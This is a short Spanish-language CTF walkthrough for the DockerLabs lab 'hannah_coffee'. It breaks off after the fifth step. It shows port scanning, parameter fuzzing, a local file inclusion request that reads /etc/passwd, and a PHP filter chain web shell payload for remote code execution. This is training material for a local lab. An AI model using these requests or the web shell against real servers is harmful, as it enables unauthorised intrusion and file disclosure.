hannah_coffee-DockerLabs🇪🇸

### 1. En primer lugar vamos a desempaquear los archivos, la llevamos a un lugar seguro e iniciamos el laboratorio.

```bash
unzip hannah_coffee.zip
sudo bash ./auto_deploy.sh hannah-coffee.tar 
```

<img width="772" height="831" alt="image" src="https://github.com/user-attachments/assets/df1df41c-e33c-4d2b-9a9d-b38a34224c70" />


### 2. Después vamos a proceder a escanear los puertos abiertos mediante nmap-

```bash
 nmap -p- -sCV 172.17.0.3
```

<img width="922" height="364" alt="image" src="https://github.com/user-attachments/assets/f2463823-8fda-4eaa-a29a-af736c561083" />


### 3. Viendo el escenario que tenemos con los puertos tenemos el puerto 21 con ftp abierto y el 80 con http. Buscaremos directorios ocultos mediante ffuf.
```bash
ffuf -u "http://172.17.0.3?FUZZ=/etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-
medium.txt -fw 198
```

<img width="971" height="534" alt="image" src="https://github.com/user-attachments/assets/b3e550e9-7741-4850-bf47-7b18dfd534e7" />


### 4. Ahora encontrando el ffuf oculto es studio vamos a utilizar curl para que escupa todo el /etc/passwd

```bash
 curl "http://172.17.0.3/?studio=/etc/passwd"
```

<img width="1058" height="942" alt="image" src="https://github.com/user-attachments/assets/7c6f10bf-7fc9-46e7-a2ad-b15cbf5116ae" />


### 5. Vamos a explotat mediante el exploit de RCE via PHP Filter Chain Generator (*https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py*)

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

<img width="1063" height="1044" alt="image" src="https://github.com/user-attachments/assets/8532d5ae-a0fc-46df-b3b3-1e681a8bf201" />




